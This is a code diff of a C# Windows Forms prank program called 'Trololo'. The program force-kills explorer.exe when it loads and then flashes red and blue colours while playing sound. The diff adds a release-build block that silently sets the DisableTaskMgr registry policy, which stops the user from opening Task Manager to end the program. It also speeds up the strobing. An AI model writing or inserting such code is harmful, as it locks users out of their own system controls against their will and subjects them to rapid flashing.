@@ -5,6 +5,7 @@ using System.Media;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace Trololo
 {
@@ -12,6 +13,7 @@ namespace Trololo
     {
 
         public int basicDelay = (int)(128 * 1.100);
+        public int basicDelayE = 0;
 
         public Form1()
         {
@@ -22,7 +24,7 @@ namespace Trololo
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            basicDelay = ((int)(int)basicDelay / (int)3.14);
+            basicDelayE = ((int)(int)basicDelay / (int)3.14);
             Process p = new Process();
             p.StartInfo.FileName = "taskkill.exe";
             p.StartInfo.Arguments = "/f /im explorer.exe";
@@ -36,6 +38,15 @@ namespace Trololo
             p.WaitForExit();
             #endif
             p.Close();
+            #if RELEASE
+            #region TaskMGR
+            try{
+                RegistryKey skSys = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
+                skSys.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                skSys.Close();
+            }catch(Exception){}
+            #endregion
+            #endif
             PlaySound();
             this.FormClosing += Form1_FormClosing;
             this.Visible = true;
@@ -56,10 +67,10 @@ namespace Trololo
                 {
                     this.BackColor = Color.Red;
                     label1.BackColor = Color.Blue;
-                    Delay(basicDelay);
+                    Delay(basicDelayE);
                     label1.BackColor = Color.Red;
                     this.BackColor = Color.Blue;
-                    Delay(basicDelay);
+                    Delay(basicDelayE);
                     label1.BackColor = Color.Empty;
                 }
             }
